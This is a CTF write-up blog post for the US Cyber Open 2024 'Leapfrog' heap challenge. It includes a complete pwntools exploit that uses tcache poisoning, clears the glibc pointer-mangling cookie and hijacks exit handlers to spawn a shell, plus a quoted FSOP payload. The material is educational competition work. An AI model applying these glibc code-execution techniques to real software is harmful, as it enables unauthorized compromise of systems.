@@ -1,0 +1,347 @@
+---
+title: 'US Cyber Open 2024: Leapfrog Writeup'
+date: '2024-08-01'
+tags: ['writeups', 'pwn']
+draft: false
+summary: 'Writeup of the Leapfrog challenge from the US Cyber Open CTF 2024 made for the US Cyber Combine.'
+---
+
+<TOCInline toc={props.toc} asDisclosure toHeading={2} />
+
+## Leapfrog
+- **Challenge Author:** LMS
+- **Challenge Description:** ROP/JOP are dead, long live code reuse attacks!
+
+***
+
+In this challenge, we are provided multiple files zipped together. These include `Dockerfile`, `chall`, `flag`, `ld-linux-x86-64.so.2`, `libc.so.6`, `libcapstone.so.4`, `libcet.so`, `libglib-2.0.so.0`, `libgmodule-2.0.so.0`, `qemu-x86_64`, `run.sh`, and `ynetd`. Wow that's a lot! First let's see how it's run in `run.sh`:
+
+```shell
+#!/bin/sh
+#./qemu-x86_64 ./a.out
+./qemu-x86_64 -plugin ./libcet.so,mode=user,ibt=on,ss=on,cpu_slots=128 -d plugin ./chall
+```
+
+So, our binary is run through qemu with the libcet plugin. CET stands for "Control-flow Enforcement Technology" and can be read more about [here](https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html). The idea is to add additional protections to the binary, in this case two are enabled `ibt` and `ss`.
+
+IBT stands for Indirect Branch Tracking which restricts COP/JOP attacks. The idea is that all code executed after a ret, call, jump, etc. must start with the `endbr64` instruction. This allows calling functions, but not jumping in the middle of them. This essentially kills any and all gadgets that are used in many exploits. We can no longer jump to snippets of code in the middle of a function and must instead call a function in its entirety.
+
+SS stands for Shadow Stack which prevents ROP attacks. The idea is that the OS creates a "Shadow Stack" which is protected from memory accesses and stores copies of return addresses. If any return addresses are corrupted, the mismatch will be detected and the program will terminate. Similar to a canary, except throughout the entire stack.
+
+Now that we understand the protections in place let's look at what the binary is doing.
+
+![image](https://hackmd.io/_uploads/B1GBQGcKA.png)
+
+We are greeted by a classic heap menu challenge. We are also given a libc leak immediately when running the program as the address of system is printed. Very nice!
+
+![image](https://hackmd.io/_uploads/SJ9t7MctC.png)
+
+The filter function restricts certain syscalls using seccomp. With seccomp-tools we can get a better understanding of what's blocked and allowed.
+
+![image](https://hackmd.io/_uploads/BkepXG9Y0.png)
+
+Hmm so we can't get a shell with a one_gadget or by calling system as execve and execveat are blocked. We will most likely need to ORW (open read write) the flag. 
+
+***Or will we...***
+
+This is where the critical unintended vulnerability occurs in the challenge. As seen in `run.sh` the program is run through qemu. An interesting thing about qemu is that it doesn't implement seccomp rules at all! This means the filter that is defined doesn't actually do anything! We can call system("/bin/sh"), but one_gadgets still won't work because of IBT.
+
+The remaining functions are very standard.
+- Create lets us malloc a function of arbitrary size
+- Edit lets us modify the content of an allocated chunk
+- Delete frees a chunk
+- Print allows us to view the content of an allocated chunk
+
+There are MANY vulnerabilities in these implementaitons, but the most important are that free does not clear pointers:
+
+![image](https://hackmd.io/_uploads/r1GbBz5YR.png)
+
+Also, print and edit have no checks to see if a chunk is free or not:
+
+![image](https://hackmd.io/_uploads/SkrXSfqK0.png)
+
+This means we have a view after free and use after free. As we are on libc version 2.39 we will use simple tcache poisoning to achieve arbitrary write.
+
+I first wrote some helper/wrapper functions to make this process easier:
+```python
+def defuscate(x,l=64):
+    p = 0
+    for i in range(l*4,0,-4): # 16 nibble
+        v1 = (x & (0xf << i )) >> i
+        v2 = (p & (0xf << i+12 )) >> i+12
+        p |= (v1 ^ v2) << i
+    return p
+
+def obfuscate(p, adr):
+    return p^(adr>>12)
+
+def create(index, size):
+    p.sendlineafter(b'Choice: ', b'1')
+    p.sendlineafter(b'Index: ', str(index).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+
+def edit(index, data):
+    p.sendlineafter(b'Choice: ', b'2')
+    p.sendlineafter(b'Index: ', str(index).encode())
+    p.sendafter(b'Data: ', data)
+
+def delete(index):
+    p.sendlineafter(b'Choice: ', b'3')
+    p.sendlineafter(b'Index: ', str(index).encode())
+
+def view(index):
+    p.sendlineafter(b'Choice: ', b'4')
+    p.sendlineafter(b'Index: ', str(index).encode())
+    p.recvuntil(b'Data: ')
+    return p.recvline()
+```
+
+At the start I read the libc leak and get a heap leak by freeing two chunks into a tcache bin and viewing one:
+
+```python
+p.recvuntil(b'Hello World: ')
+libc.address = int(p.recvline().strip(),16) - libc.symbols['system']
+
+print('LIBC BASE:', hex(libc.address))
+
+create(0, 10)
+create(1, 10)
+delete(0)
+delete(1)
+heap_leak = defuscate(u64(view(1)[0:8]))
+```
+
+Now that we have a heap leak, we can overwrite the forward pointer of a chunk in a tcache bin and allocate it to an arbitrary location like so:
+
+```python
+create(4, 100)
+create(5, 100)
+delete(4)
+delete(5)
+edit(5, p64(obfuscate(target_addr, heap_leak)))
+create(4, 100)
+create(5, 100)
+edit(5, payload)
+```
+
+Now the real challenge begins :sweat_smile:. We have arbitrary write, but because of the CET protections and regular protections it will be very difficult to escalate this into something useful.
+
+![image](https://hackmd.io/_uploads/HJB5Uf9YA.png)
+
+However, the unintended makes our life significantly easier. We no longer have to chain calls to open/read/write or find creative ways to write shellcode. Our only goal is to call the system function with rdi pointing to /bin/sh.
+
+In positions like this, I usually turn to this [resource](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc) created by the Blue Water player nobodyisnobody. It lists a multitude of different ways to achieve code execution with arbitrary write.
+
+The first method I tried was overwriting libc got entries. After trying to overwrite almost every libc GOT entry, 3 were actually being called. However, two were being called by printf and one was called by puts. 
+
+![image](https://hackmd.io/_uploads/S12twM5tC.png)
+
+The first puts call was called with the argument "Menu". I wasn't able to modify this string in any way as it was read-only, so no hope there.
+
+![image](https://hackmd.io/_uploads/S1XpPf9Y0.png)
+
+The same happened with printf. It would be called with the argument "Choice: ". System was being succesfully called, but with no argument control it was useless.
+
+Next, I tried FSOP. Nobodyisnobody provides a nice way to trigger system("/bin/sh") using FSOP shown below:
+
+```python
+# some constants
+stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
+stdout = libc.sym['_IO_2_1_stdout_']
+fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
+# our gadget
+gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx
+
+fake = FileStructure(0)
+fake.flags = 0x3b01010101010101
+fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
+fake._IO_save_base = gadget
+fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
+fake._lock=stdout_lock
+fake._codecvt= stdout + 0xb8
+fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
+fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
+# write the fake Filestructure to stdout
+write(libc.sym['_IO_2_1_stdout_'], bytes(fake))
+# enjoy your shell
+```
+
+The only problem is that this method used a `add rdi, 0x10 ; jmp rcx` gadget in order to set rdi. This is a gadget and doesn't start with the `endbr64` instruction, so it is also no good.
+
+Another method proposed by Nobodyisnobody is fake custom conversion specifiers. However, these rely on being able to control the input to printf, so this is also no good.
+
+All of the remaining methods relied on exit. Luckily, in this challenge, when option 0 is entered the program will call `exit()`. This is good as libc will execute the function `__run_exit_handlers()` which we can abuse.
+
+![image](https://hackmd.io/_uploads/SJjGKz5YA.png)
+
+The final method is what ended up working. In TLS (Thread Local Storage) the canary is stored, but also a PTR_MANGLE cookie. This cookie is used to mangle pointers that are called during exit in the initial structure. To get around this, we simply clear out the value of this cookie to be 0, so when xored it's like nothing changed.
+
+```python
+tls = libc.address - 0x3000
+tls_base = tls+0x740
+# remote different base
+tls_base = libc.address + 1992512
+cookie = tls_base+0x30
+
+# clear PTR_MANGLE cookie
+create(4, 100)
+create(5, 100)
+delete(4)
+delete(5)
+edit(5, p64(obfuscate(cookie, heap_leak)))
+create(4, 100)
+create(5, 100)
+print('Cookie:', hex(cookie))
+edit(5, p64(0))
+```
+
+I updated my script to now allocate a chunk in the TLS to clear this cookie.
+
+![image](https://hackmd.io/_uploads/BJDy5f9KR.png)
+
+Here, the cookie can be seen at address `0x7f3dd5072770` right after the canary. I simply allocate a chunk here and overwrite it with null bytes. Also, the TLS is a constant offset away from libc base, so no extra leaking was needed.
+
+Next, the `initial` structure was going to be targetted.
+
+![image](https://hackmd.io/_uploads/r1g39MctC.png)
+
+Here, the value 4 is written which represents the "flavor" for `__run_exit_handlers()`. In the source code, the flavor of 4 represents ef_cxa:
+
+![image](https://hackmd.io/_uploads/SkcWifcYC.png)
+
+It will demangle the pointer at cxafct and execute it with an argument if provided. So, we simply overwrite the initial structure with our own mangled pointer and the pointer to /bin/sh right after. To do this, I added the following to the script:
+
+```python
+target = libc.sym['initial']+16
+print('Target:', hex(target))
+payload = p64(4) + p64(libc.sym['system']<<17) + p64(next(libc.search(b'/bin/sh')))
+
+create(2, 1032)
+create(3, 1032)
+delete(2)
+delete(3)
+edit(3, p64(obfuscate(target, heap_leak)))
+create(2, 1032)
+create(3, 1032)
+edit(3, payload)
+```
+
+Note: Although the PTR_MANGLE cookie is cleared, the address must still be bitwise shifted left by 17. We use the same method to get arbitrary write. This is what the initial structure looks like after overwriting:
+
+![image](https://hackmd.io/_uploads/BJB-nMqFC.png)
+
+All that's left is to exit and enjoy our shell!
+
+![image](https://hackmd.io/_uploads/S1ojnf9K0.png)
+
+The flag mentions FOP, though we were able to avoid that with the unintended. It's always important to remember that many security features are lost in qemu.
+
+### Full script:
+```python=
+from pwn import *
+
+elf = ELF("./chall_patched",checksec=0)
+libc = ELF("./libc.so.6",checksec=0)
+ld = ELF("./ld-linux-x86-64.so.2",checksec=0)
+context.binary = elf
+
+def conn():
+    if args.GDB:
+        #p = remote("0.0.0.0", 1024)
+        script = '''
+        b main
+        b edit
+        b *(create+56)
+        c
+        '''
+        p = gdb.debug(elf.path, gdbscript=script)
+    elif args.REMOTE:
+        p = remote("0.cloud.chals.io", 33799)
+    else:
+        #p = process("./run.sh",shell=True)
+        p = remote('0.0.0.0', 1024)
+        #p = process(elf.path)
+    return p
+
+def defuscate(x,l=64):
+    p = 0
+    for i in range(l*4,0,-4): # 16 nibble
+        v1 = (x & (0xf << i )) >> i
+        v2 = (p & (0xf << i+12 )) >> i+12
+        p |= (v1 ^ v2) << i
+    return p
+
+def obfuscate(p, adr):
+    return p^(adr>>12)
+
+def create(index, size):
+    p.sendlineafter(b'Choice: ', b'1')
+    p.sendlineafter(b'Index: ', str(index).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+
+def edit(index, data):
+    p.sendlineafter(b'Choice: ', b'2')
+    p.sendlineafter(b'Index: ', str(index).encode())
+    p.sendafter(b'Data: ', data)
+
+def delete(index):
+    p.sendlineafter(b'Choice: ', b'3')
+    p.sendlineafter(b'Index: ', str(index).encode())
+
+def view(index):
+    p.sendlineafter(b'Choice: ', b'4')
+    p.sendlineafter(b'Index: ', str(index).encode())
+    p.recvuntil(b'Data: ')
+    return p.recvline()
+
+def run():
+    global p
+    p = conn()
+
+    p.recvuntil(b'Hello World: ')
+    libc.address = int(p.recvline().strip(),16) - libc.symbols['system']
+
+    print('LIBC BASE:', hex(libc.address))
+
+    create(0, 10)
+    create(1, 10)
+    delete(0)
+    delete(1)
+    heap_leak = defuscate(u64(view(1)[0:8]))
+
+    tls = libc.address - 0x3000
+    tls_base = tls+0x740
+    # remote different base
+    tls_base = libc.address + 1992512
+    cookie = tls_base+0x30
+
+    # clear PTR_MANGLE cookie
+    create(4, 100)
+    create(5, 100)
+    delete(4)
+    delete(5)
+    edit(5, p64(obfuscate(cookie, heap_leak)))
+    create(4, 100)
+    create(5, 100)
+    print('Cookie:', hex(cookie))
+    edit(5, p64(0))
+
+    target = libc.sym['initial']+16
+    print('Target:', hex(target))
+    payload = p64(4) + p64(libc.sym['system']<<17) + p64(next(libc.search(b'/bin/sh')))
+
+    create(2, 1032)
+    create(3, 1032)
+    delete(2)
+    delete(3)
+    edit(3, p64(obfuscate(target, heap_leak)))
+    create(2, 1032)
+    create(3, 1032)
+    edit(3, payload)
+
+    p.interactive()
+
+run()
+```
+
+### Flag: `SIVUSCG{FOP_TILL_YOU_DROP}`
